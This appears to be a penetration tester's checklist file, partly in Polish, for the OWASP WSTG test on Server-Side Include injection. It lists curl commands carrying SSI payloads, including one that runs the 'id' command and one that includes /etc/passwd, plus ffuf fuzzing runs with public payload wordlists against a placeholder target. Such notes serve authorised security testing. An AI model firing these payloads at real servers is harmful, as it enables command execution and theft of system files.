@@ -1,0 +1,41 @@
+================================================================================
+WSTG-INPV-08 — Testing for SSI Injection
+================================================================================
+CELE:
+- Identify SSI injection points
+- Assess the severity of the injection
+
+================================================================================
+KOMENDY
+================================================================================
+
+# --- Reczne testowanie SSI ---
+curl -s "https://TARGET/page?name=<!--#echo var=\"DATE_LOCAL\"-->"
+curl -s "https://TARGET/page?name=<!--#exec cmd=\"id\"-->"
+curl -s "https://TARGET/page?name=<!--#include virtual=\"/etc/passwd\"-->"
+curl -s "https://TARGET/page?name=<!--#config errmsg=\"SSI_DETECTED\"-->"
+
+# --- Sprawdzenie czy serwer obsluguje SSI ---
+curl -sI "https://TARGET/" | grep -i "server"
+# Apache z mod_include, Nginx z ssi on, IIS z SSI
+
+================================================================================
+KOMENDY Z WORDLISTAMI
+================================================================================
+
+# --- PayloadsAllTheThings SSI payloads ---
+ffuf -u "https://TARGET/page?name=FUZZ" -w "/home/parallels/Desktop/WSTG/PayloadsAllTheThings-master/Server Side Include Injection/Files/ssi_esi.txt" -mc all -o output_ffuf_ssi.json
+
+# --- SecLists SSI ---
+ffuf -u "https://TARGET/page?name=FUZZ" -w /home/parallels/Desktop/WSTG/SecLists-master/Fuzzing/SSI-Injection-Jhaddix.txt -mc all -o output_ffuf_seclists_ssi.json
+
+# --- fuzzdb SSI ---
+ffuf -u "https://TARGET/page?name=FUZZ" -w /home/parallels/Desktop/WSTG/fuzzdb-master/attack/server-side-include/SSI-Injection.txt -mc all -o output_ffuf_fuzzdb_ssi.json
+
+================================================================================
+WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
+================================================================================
+1. Sprawdz czy serwer uzywa SSI (pliki .shtml, .shtm, .stm)
+2. Testuj wstrzykiwanie SSI dyrektyw w parametrach i formularzach
+3. Sprawdz ESI (Edge Side Includes) jesli jest CDN/Varnish
+4. Uzyj Burp Repeater do testowania roznych dyrektyw SSI
